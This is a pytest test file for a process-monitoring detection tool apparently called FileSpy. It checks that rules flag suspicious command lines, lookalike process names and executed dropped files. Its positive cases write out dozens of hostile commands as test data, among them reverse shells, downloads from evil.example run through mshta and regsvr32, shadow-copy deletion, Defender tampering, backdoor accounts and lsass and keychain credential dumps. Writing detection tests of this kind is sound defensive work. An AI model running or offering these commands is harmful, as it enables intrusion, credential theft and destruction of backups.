import os
import sys

import pytest

from filespy.events import Severity, summarize
from filespy.procrules import CMD_RULES, ProcInfo, command_indicators, evaluate, lookalike_of
from filespy.state import SharedState

W, L, M = "win32", "linux", "darwin"

# (platform, rule id, command line that must match)
POSITIVE = [
    (W, "ps_encoded", "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
    (W, "ps_encoded", 'powershell -e "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"'),
    (W, "ps_encoded", "pwsh -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
    (W, "ps_encoded", "powershell.exe \u2013enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
    (W, "ps_encoded", "powershell \u2014EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
    (W, "ps_hidden_bypass", "powershell -w hidden -ep bypass -file a.ps1"),
    (W, "ps_hidden_bypass", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\x.ps1"),
    (W, "ps_hidden_bypass", "powershell -w 1 -nop -c Get-Date"),
    (W, "ps_download", "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""),
    (W, "ps_download", "powershell Invoke-WebRequest http://x/a.exe -OutFile a.exe"),
    (W, "ps_decode_run", "powershell -c [Convert]::FromBase64String($x)"),
    (W, "defender_tamper", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"),
    (W, "defender_tamper", "powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public"),
    (W, "mshta_remote", "mshta.exe http://evil.example/a.hta"),
    (W, "mshta_remote", 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc""")'),
    (W, "regsvr32_scriptlet", "regsvr32 /s /n /u /i:http://evil.example/a.sct scrobj.dll"),
    (W, "rundll32_abuse", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'),
    (W, "rundll32_abuse", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full"),
    (W, "certutil_download", "certutil.exe -urlcache -split -f http://x/a.exe a.exe"),
    (W, "certutil_decode", "certutil -decode a.txt a.exe"),
    (W, "bitsadmin_transfer", "bitsadmin /transfer job /download /priority high http://x/a.exe C:\\a.exe"),
    (W, "wmic_exec", "wmic process call create \"cmd /c calc\""),
    (W, "shadow_delete", "vssadmin.exe delete shadows /all /quiet"),
    (W, "shadow_delete", "wmic shadowcopy delete"),
    (W, "shadow_delete", "bcdedit /set {default} recoveryenabled No"),
    (W, "log_clear", "wevtutil cl Security"),
    (W, "schtasks_create_suspicious", "schtasks /create /tn Upd /tr \"powershell -w hidden -file C:\\a.ps1\" /sc onlogon"),
    (W, "schtasks_create_suspicious", "schtasks.exe /Create /SC MINUTE /TN x /TR C:\\Users\\bob\\AppData\\Roaming\\x.exe"),
    (W, "schtasks_create", "schtasks /create /tn Backup /tr \"C:\\Program Files\\App\\b.exe\" /sc daily"),
    (W, "schtasks_create_suspicious", "schtasks -create -tn x -tr C:\\Users\\a\\AppData\\Roaming\\rat.exe -sc onlogon"),
    (W, "bitsadmin_transfer", "bitsadmin -transfer job http://x/a.exe C:\\a.exe"),
    (W, "certutil_download", "certutil.exe \u2013urlcache -f http://x/a.exe a.exe"),
    (W, "reg_persistence", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\x.exe /f"),
    (W, "reg_security_tamper", 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f'),
    (W, "service_create", "sc create Upd binPath= C:\\ProgramData\\u.exe start= auto"),
    (W, "firewall_tamper", "netsh advfirewall set allprofiles state off"),
    (W, "security_tool_stop", "sc stop WinDefend"),
    (W, "security_tool_stop", "taskkill /f /im MsMpEng.exe"),
    (W, "account_add", "net user backdoor P@ss /add"),
    (W, "account_add", "net localgroup administrators backdoor /add"),
    (W, "credential_dump", "procdump64.exe -ma lsass.exe l.dmp"),
    (W, "credential_dump", "reg save HKLM\\SAM sam.hiv"),
    (W, "script_from_user_dir", "wscript.exe C:\\Users\\bob\\AppData\\Local\\Temp\\run.vbs"),
    (W, "attrib_hide", "attrib +h +s C:\\Users\\Public\\a.exe"),
    (W, "tunnel_tool", "C:\\t\\ngrok.exe tcp 3389"),
    (W, "miner", "xmrig.exe -o stratum+tcp://pool.example:3333 --donate-level 1"),
    (L, "reverse_shell", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    (L, "reverse_shell", "nc -e /bin/sh 10.0.0.1 4444"),
    (L, "reverse_shell", "python3 -c import pty;pty.spawn('/bin/bash')"),
    (L, "reverse_shell", "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty,stderr"),
    (L, "pipe_to_shell", "sh -c curl -fsSL http://x/i.sh | bash"),
    (L, "pipe_to_shell", "sh -c wget -qO- http://x/i.sh | sudo sh"),
    (L, "base64_to_shell", "sh -c echo aGk= | base64 -d | sh"),
    (L, "history_tamper", "bash -c unset HISTFILE; ls"),
    (L, "security_disable", "systemctl stop auditd"),
    (L, "security_disable", "ufw disable"),
    (L, "preload_write", "sh -c echo /tmp/x.so >> /etc/ld.so.preload"),
    (L, "preload_env", "env LD_PRELOAD=/tmp/x.so /usr/bin/id"),
    (L, "cron_edit", "sh -c (crontab -l; echo '@reboot /tmp/x') | crontab -"),
    (L, "miner", "./xmrig --coin=monero -o pool:3333"),
    (M, "osascript_prompt", 'osascript -e display dialog "Password" default answer "" with hidden answer'),
    (M, "quarantine_removed", "xattr -d com.apple.quarantine /Users/a/Downloads/x.app"),
    (M, "gatekeeper_off", "spctl --master-disable"),
    (M, "keychain_dump", "security find-generic-password -ga Chrome -w"),
    (M, "launchctl_temp", "launchctl load /tmp/com.x.plist"),
    (M, "reverse_shell", "bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"),
]

# (platform, benign command line that must produce no indicator at all)
NEGATIVE = [
    (W, "powershell.exe -NoProfile -File C:\\Scripts\\backup.ps1"),
    (W, "powershell -Command Get-Process | Sort-Object CPU"),
    (W, "powershell -ExecutionPolicy Bypass -File C:\\tools\\build.ps1"),
    (W, "powershell -w 1 -File C:\\tools\\report.ps1"),
    (W, "C:\\Windows\\System32\\rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
    (W, "regsvr32 /s C:\\Windows\\System32\\vbscript.dll"),
    (W, "certutil -hashfile a.iso SHA256"),
    (W, "mshta.exe C:\\Program Files\\App\\ui.hta"),
    (W, "schtasks /query /fo csv"),
    (W, "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    (W, "sc query WinDefend"),
    (W, "net user"),
    (W, "netsh advfirewall show allprofiles"),
    (W, "vssadmin list shadows"),
    (W, "wevtutil qe System /c:5"),
    (W, "attrib +r notes.txt"),
    (W, "wscript.exe C:\\Program Files\\Vendor\\helper.vbs"),
    (W, "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"),
    (L, "nc -zv example.com 443"),
    (L, "curl -fsSL https://example.com/file.tar.gz -o file.tar.gz"),
    (L, "base64 -d input.b64"),
    (L, "bash -c ls -la /tmp"),
    (L, "crontab -l"),
    (L, "systemctl status auditd"),
    (L, "iptables -L -n"),
    (L, "python3 -m http.server 8000"),
    (L, "wget https://example.com/a.iso"),
    (M, "osascript -e tell application \"Finder\" to activate"),
    (M, "xattr -l /Applications/Safari.app"),
    (M, "spctl --status"),
    (M, "launchctl list"),
    (M, "security find-certificate -a"),
]


@pytest.mark.parametrize("platform,rule,command", POSITIVE)
def test_command_rules_match(platform, rule, command):
    assert f"proc.cmd.{rule}" in {i.id for i in command_indicators(command, platform)}


@pytest.mark.parametrize("platform,command", NEGATIVE)
def test_benign_commands_are_quiet(platform, command):
    assert command_indicators(command, platform) == []


def test_every_rule_has_a_positive_test():
    tested = {rule for _p, rule, _c in POSITIVE}
    assert {r.id for r in CMD_RULES} <= tested


def test_windows_rules_do_not_fire_on_linux_and_long_input_is_fast():
    assert command_indicators("vssadmin delete shadows /all", L) == []
    import time
    start = time.monotonic()
    command_indicators("powershell " + "-e " * 20000 + "a" * 50000, W)
    command_indicators("schtasks /create " + "x " * 50000, W)
    assert time.monotonic() - start < 2.0


@pytest.mark.parametrize(
    "name,target",
    [("svch0st.exe", "svchost.exe"), ("scvhost.exe", "svchost.exe"), ("svchosts.exe", "svchost.exe"),
     ("lsasss.exe", "lsass.exe"), ("expl0rer.exe", "explorer.exe"), ("csrss\u0430.exe", "csrss.exe"),
     ("svchost.exe", ""), ("taskhost.exe", ""), ("chrome.exe", ""), ("service.exe", ""), ("notepad.exe", "")],
)
def test_lookalike(name, target):
    assert lookalike_of(name) == target


def ids(indicators):
    return {i.id for i in indicators}


def test_masquerade_and_parent_child():
    fake = ProcInfo(1, "svchost.exe", r"C:\Users\bob\AppData\Roaming\svchost.exe")
    assert "proc.system_name_wrong_dir" in ids(evaluate(fake, W))
    real = ProcInfo(2, "svchost.exe", r"C:\Windows\System32\svchost.exe", ["svchost.exe", "-k", "netsvcs"])
    assert evaluate(real, W) == []
    macro = ProcInfo(3, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                     ["powershell.exe"], parent_name="WINWORD.EXE")
    assert "proc.office_child" in ids(evaluate(macro, W))
    normal = ProcInfo(4, "cmd.exe", r"C:\Windows\System32\cmd.exe", ["cmd.exe"], parent_name="explorer.exe")
    assert evaluate(normal, W) == []
    decoy = ProcInfo(5, "invoice.pdf.exe", r"C:\Users\bob\Downloads\invoice.pdf.exe")
    assert "proc.double_extension" in ids(evaluate(decoy, W))


def test_dropped_file_executed_and_young_image(tmp_path):
    exe = tmp_path / "payload"
    exe.write_bytes(b"x")
    state = SharedState()
    state.started = exe.stat().st_mtime + 3600  # the file predates the session
    proc = ProcInfo(10, "payload", str(exe), [str(exe)])
    fresh = evaluate(proc, L, state)
    assert "proc.dropped_file_executed" not in ids(fresh) and "proc.young_image" in ids(fresh)
    state.note_drop(str(exe), "abc", "ev1", score=25)  # e.g. a signed installer helper
    calm = evaluate(proc, L, state)
    assert ids(calm) == {"proc.dropped_file_executed"} and summarize(calm)[1] is Severity.MEDIUM
    state.note_drop(str(exe), "abc", "ev1", score=50)  # an unsigned program
    assert summarize(evaluate(proc, L, state))[1] is Severity.HIGH
    state.note_drop(str(exe), "abc", "ev1", score=90)  # matched a signature
    assert summarize(evaluate(proc, L, state))[1] is Severity.CRITICAL
    old = evaluate(proc, L, None, now=exe.stat().st_mtime + 86400)
    assert "proc.young_image" not in ids(old)
    # A coarse clock can read slightly earlier than the file's own timestamp (Windows, Python 3.10).
    skewed = evaluate(proc, L, None, now=exe.stat().st_mtime - 0.01)
    assert "proc.young_image" in ids(skewed)


def created_now(monkeypatch):
    """Pretend the system records creation times (Windows and macOS do; Linux does not)."""
    monkeypatch.setattr("filespy.procrules.birth_time", lambda info, platform=None: info.st_mtime)


def test_birth_time_uses_a_real_creation_time_only():
    from types import SimpleNamespace

    from filespy.procrules import birth_time

    assert birth_time(SimpleNamespace(st_birthtime=5.0, st_ctime=9.0), "darwin") == 5.0
    assert birth_time(SimpleNamespace(st_ctime=7.0), "win32") == 7.0  # Windows before Python 3.12
    assert birth_time(SimpleNamespace(st_ctime=7.0, st_mtime=8.0), "linux") is None  # ctime is not creation


def test_file_created_during_the_session_counts_as_dropped_even_before_it_is_reported(tmp_path, monkeypatch):
    exe = tmp_path / "payload"
    exe.write_bytes(b"x")
    state = SharedState()
    state.started = exe.stat().st_mtime - 5  # created after FileSpy started; no file event yet
    proc = ProcInfo(10, "payload", str(exe), [str(exe)])
    if sys.platform.startswith("linux"):
        assert "proc.dropped_file_executed" not in ids(evaluate(proc, L, state))  # no creation time to go on
    created_now(monkeypatch)
    assert "proc.dropped_file_executed" in ids(evaluate(proc, L, state))
    ignored = evaluate(proc, L, state, exclude=[str(tmp_path).replace("\\", "/").lower() + "/*"])
    assert "proc.dropped_file_executed" not in ids(ignored)  # the user excluded this folder
    system = ProcInfo(11, "ls", "/usr/bin/ls", ["/usr/bin/ls"])
    state.started = 0.0
    assert evaluate(system, L, state) == []  # system folders are never treated as drops


def test_dropped_script_run_by_an_interpreter(tmp_path, monkeypatch):
    script = tmp_path / "stage2.sh"
    script.write_text("#!/bin/sh\nsleep 1\n")
    state = SharedState()
    state.started = script.stat().st_mtime + 3600
    proc = ProcInfo(12, "sh", "/bin/sh", ["/bin/sh", str(script)])
    assert evaluate(proc, L, state) == []
    state.note_drop(str(script), "abc", "ev", score=20)
    assert ids(evaluate(proc, L, state)) == {"proc.dropped_script_executed"}
    state.forget_drop(str(script))
    state.started = script.stat().st_mtime - 5
    monkeypatch.setattr("filespy.procrules.birth_time", lambda info, platform=None: info.st_mtime)
    assert "proc.dropped_script_executed" in ids(evaluate(proc, L, state))
    relative = ProcInfo(13, "sh", "/bin/sh", ["/bin/sh", "stage2.sh"])
    assert evaluate(relative, L, state) == []


def test_deleted_image_on_linux():
    proc = ProcInfo(11, "x", "/tmp/x (deleted)")
    assert "proc.deleted_image" in ids(evaluate(proc, L))


def test_dropped_program_alarm_is_raised_once_and_judged_by_content(make_ctx, monkeypatch, tmp_path):
    from filespy.testing import make_pe

    plain = tmp_path / "tool"
    plain.write_bytes(make_pe())
    rat = tmp_path / "client"
    rat.write_bytes(make_pe(payload=b"AsyncMutex_6SI8OkPnk"))

    def info(path, pid):
        return ProcInfo(pid, path.name, str(path), [str(path)], create_time=1.0)

    from filespy.monitors import processes

    ctx = make_ctx(platform="linux")
    monitor = processes.ProcessMonitor(ctx)
    monitor.setup()
    ctx.state.note_drop(str(plain), "a", "ev1", score=25)
    ctx.state.note_drop(str(rat), "b", "ev2", score=25)
    records = [info(plain, 1), info(plain, 2), info(rat, 3)]
    monkeypatch.setattr(processes, "snapshot", lambda pid: records.pop(0))
    for pid in (1, 2, 3):
        monitor._inspect(pid)
    first, again, malware = ctx.bus.find("process")
    # Where a plain program lives does not make running it HIGH; that was the source of developer noise.
    assert first.title.startswith("A dropped file was executed") and first.severity is Severity.MEDIUM
    assert again.title.startswith("A dropped program was started again") and again.severity < Severity.LOW
    assert ctx.state.flagged(2) is not None  # still watched on the network
    # What is in the file still counts: a RAT marker makes the same situation critical.
    assert malware.severity is Severity.CRITICAL and "file.rule.rat.asyncrat" in ids(malware.indicators)
    plain.write_bytes(make_pe(payload=b"rebuilt"))  # a new build is a new program
    stamp = plain.stat().st_mtime + 10
    os.utime(plain, (stamp, stamp))  # coarse file clocks could otherwise give the rebuild the same time
    records.append(info(plain, 4))
    monitor._inspect(4)
    assert ctx.bus.find("process")[-1].title.startswith("A dropped file was executed")
